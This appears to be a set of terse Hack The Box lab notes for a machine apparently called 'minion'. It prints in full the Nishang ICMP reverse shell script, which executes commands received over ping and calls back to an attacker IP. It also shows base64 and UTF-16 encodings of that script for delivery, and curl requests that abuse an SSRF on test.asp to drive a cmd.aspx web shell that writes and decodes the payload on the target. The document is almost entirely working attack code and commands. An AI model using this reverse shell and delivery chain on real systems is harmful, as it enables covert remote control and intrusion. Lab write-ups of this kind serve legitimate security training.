

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1

```bash
 mv Invoke-PowerShellIcmp.ps1 shell.ps1
```

```powershell
cat shell.ps1         
function Invoke-PowerShellIcmp
{       
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128
    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}

Invoke-PowerShellIcmp -IPAddress 10.10.17.19
```

```bash
cat shell.ps1 | base64 -w0
ZnVuY3Rpb24gSW52b2tlLVBvd2VyU2hlbGxJY21wCnsgCiAgICAgICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJUEFkZHJlc3MsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gNSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludF0KICAgICAgICAkQnVmZmVyU2l6ZSA9IDEyOAoKICAgICkKCiAgICAkSUNNUENsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrSW5mb3JtYXRpb24uUGluZwogICAgJFBpbmdPcHRpb25zID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk5ldHdvcmtJbmZvcm1hdGlvbi5QaW5nT3B0aW9ucwogICAgJFBpbmdPcHRpb25zLkRvbnRGcmFnbWVudCA9ICRUcnVlCgogICAgJHNlbmRieXRlcyA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygiV2luZG93cyBQb3dlclNoZWxsIHJ1bm5pbmcgYXMgdXNlciAiICsgJGVudjp1c2VybmFtZSArICIgb24gIiArICRlbnY6Y29tcHV0ZXJuYW1lICsgImBuQ29weXJpZ2h0IChDKSAyMDE1IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi4gQWxsIHJpZ2h0cyByZXNlcnZlZC5gbmBuIikKICAgICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAsICRzZW5kYnl0ZXMsICRQaW5nT3B0aW9ucykgfCBPdXQtTnVsbAoKICAgICRzZW5kYnl0ZXMgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJ1BTICcgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgJz4gJykKICAgICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAsICRzZW5kYnl0ZXMsICRQaW5nT3B0aW9ucykgfCBPdXQtTnVsbAoKICAgIHdoaWxlICgkdHJ1ZSkKICAgIHsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCcnKQogICAgICAgICRyZXBseSA9ICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAsICRzZW5kYnl0ZXMsICRQaW5nT3B0aW9ucykKICAgICAgICAKICAgICAgICBpZiAoJHJlcGx5LkJ1ZmZlcikKICAgICAgICB7CiAgICAgICAgICAgICRyZXNwb25zZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRTdHJpbmcoJHJlcGx5LkJ1ZmZlcikKICAgICAgICAgICAgJHJlc3VsdCA9IChJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkcmVzcG9uc2UgMj4mMSB8IE91dC1TdHJpbmcgKQogICAgICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRyZXN1bHQpCiAgICAgICAgICAgICRpbmRleCA9IFttYXRoXTo6Zmxvb3IoJHNlbmRieXRlcy5sZW5ndGgvJEJ1ZmZlclNpemUpCiAgICAgICAgICAgICRpID0gMAoKICAgICAgICAgICAgaWYgKCRzZW5kYnl0ZXMubGVuZ3RoIC1ndCAkQnVmZmVyU2l6ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgd2hpbGUgKCRpIC1sdCAkaW5kZXggKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRzZW5kYnl0ZXMyID0gJHNlbmRieXRlc1soJGkqJEJ1ZmZlclNpemUpLi4oKCRpKzEpKiRCdWZmZXJTaXplLTEpXQogICAgICAgICAgICAgICAgICAgICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAwLCAkc2VuZGJ5dGVzMiwgJFBpbmdPcHRpb25zKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAgICAgJGkgKz0xCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkcmVtYWluaW5naW5kZXggPSAkc2VuZGJ5dGVzLkxlbmd0aCAlICRCdWZmZXJTaXplCiAgICAgICAgICAgICAgICBpZiAoJHJlbWFpbmluZ2luZGV4IC1uZSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRzZW5kYnl0ZXMyID0gJHNlbmRieXRlc1soJGkqJEJ1ZmZlclNpemUpLi4oJHNlbmRieXRlcy5MZW5ndGgpXQogICAgICAgICAgICAgICAgICAgICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAwLCAkc2VuZGJ5dGVzMiwgJFBpbmdPcHRpb25zKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSUNNUENsaWVudC5TZW5kKCRJUEFkZHJlc3MsNjAgKiAxMDAwMCwgJHNlbmRieXRlcywgJFBpbmdPcHRpb25zKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHNlbmRieXRlcyA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygiYG5QUyAiICsgKEdldC1Mb2NhdGlvbikuUGF0aCArICc+ICcpCiAgICAgICAgICAgICRJQ01QQ2xpZW50LlNlbmQoJElQQWRkcmVzcyw2MCAqIDEwMDAsICRzZW5kYnl0ZXMsICRQaW5nT3B0aW9ucykgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkRGVsYXkKICAgICAgICB9CiAgICB9Cn0KCkludm9rZS1Qb3dlclNoZWxsSWNtcCAtSVBBZGRyZXNzIDEwLjEwLjE3LjE5Cgo=
```

```bash
cat shell.ps1 | xxd                     
00000000: 6675 6e63 7469 6f6e 2049 6e76 6f6b 652d  function Invoke-
00000010: 506f 7765 7253 6865 6c6c 4963 6d70 0a7b  PowerShellIcmp.{
00000020: 200a 2020 2020 2020 2020 0a20 2020 205b   .        .    [
00000030: 436d 646c 6574 4269 6e64 696e 6728 295d  CmdletBinding()]
00000040: 2050 6172 616d 280a 0a20 2020 2020 2020   Param(..       
00000050: 205b 5061 7261 6d65 7465 7228 506f 7369   [Parameter(Posi
00000060: 7469 6f6e 203d 2030 2c20 4d61 6e64 6174  tion = 0, Mandat
00000070: 6f72 7920 3d20 2474 7275 6529 5d0a 2020  ory = $true)].
<SNIP>
```

```bash
cat shell.ps1 | iconv -t utf-16le | xxd
cat shell.ps1 | iconv -t utf-16le | xxd
00000000: 6600 7500 6e00 6300 7400 6900 6f00 6e00  f.u.n.c.t.i.o.n.
00000010: 2000 4900 6e00 7600 6f00 6b00 6500 2d00   .I.n.v.o.k.e.-.
00000020: 5000 6f00 7700 6500 7200 5300 6800 6500  P.o.w.e.r.S.h.e.
<SNIP>
```

```bash
cat shell_b64.ps1 
ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAEkAYwBtAHAA
CgB7ACAACgAgACAAIAAgACAAIAAgACAACgAgACAAIAAgAFsAQwBtAGQAbABlAHQAQgBpAG4AZABpAG4A
ZwAoACkAXQAgAFAAYQByAGEAbQAoAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUA
cgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQA
cgB1AGUAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAUwB0AHIAaQBuAGcAXQAKACAAIAAgACAAIAAgACAA
IAAkAEkAUABBAGQAZAByAGUAcwBzACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQA
ZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQA
ZgBhAGwAcwBlACkAXQAKACAAIAAgACAAIAAgACAAIABbAEkAbgB0AF0ACgAgACAAIAAgACAAIAAgACAA
JABEAGUAbABhAHkAIAA9ACAANQAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUA
<SNIP>
```

```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

```bash
curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=type C:\Programdata\r.ps1'


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
```

```bash
curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=powershell $file = Get-Content C:\Programdata\r.ps1'


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/minion]
└─# curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=powershell $decodedFile = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))'


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/minion]
└─# curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=powershell $moveFile = echo $decodedFile > C:\Programdata\rev.ps1'           


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
```

```bash
curl -X GET -G 'http://10.129.255.40:62696/test.asp' --data-urlencode 'u=http://127.0.0.1/cmd.aspx?xcmd=type C:\Programdata\rev.ps1'         


<html>
<body>
Exit Status=0
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>
```
https://github.com/bdamele/icmpsh


[enlace](http://10.129.255.40:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell%20$file%20=%20Get-Content%20C:\Temp\re.ps1;%20$decodedFile%20=%20[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file));%20$decodedFile%20%3E%20C:\Temp\s.ps1)
```baqsh
http://10.129.255.40:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell%20$file%20=%20Get-Content%20C:\Temp\re.ps1%20-Raw;%20$decodedFile%20=%20[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file));%20$decodedFile%20%3E%20C:\Temp\sh.ps1
```